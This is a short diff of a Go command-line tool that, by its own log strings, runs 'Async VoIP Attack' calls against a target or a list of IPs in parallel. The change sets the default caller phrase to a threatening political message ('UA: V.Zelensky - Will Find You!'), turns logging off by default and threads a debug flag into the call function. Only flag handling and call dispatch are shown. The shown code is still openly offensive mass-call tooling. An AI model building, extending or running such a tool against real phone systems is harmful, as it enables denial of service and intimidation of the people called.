@@ -26,11 +26,11 @@ func main() {
 		"Target url or target file to attack ")
 	phrase := flag.String(
 		"p",
-		"sip:100@1.1.1.1",
+		"UA: V.Zelensky - Will Find You!",
 		"Your phrase to be shown")
 	debug := flag.Bool(
 		"d",
-		true,
+		false,
 		"Flag to enable, disable logs")
 
 	flag.Parse()
@@ -63,7 +63,7 @@ func main() {
 			}
 			ch := make(chan string)
 			go printChannelData(ch, *debug)
-			makeCall(*target, sport, *phrase, ch)
+			makeCall(*target, sport, *phrase, *debug, ch)
 		} else {
 			if *debug {
 				log.Println("\n\u001B[34m[+] The target is in file. Starting Async VoIP Attack...")
@@ -71,7 +71,7 @@ func main() {
 			for _, ip := range ips {
 				ch := make(chan string)
 				go printChannelData(ch, *debug)
-				go makeCall(ip, sport, *phrase, ch)
+				go makeCall(ip, sport, *phrase, *debug, ch)
 			}
 		}
 		if *debug {
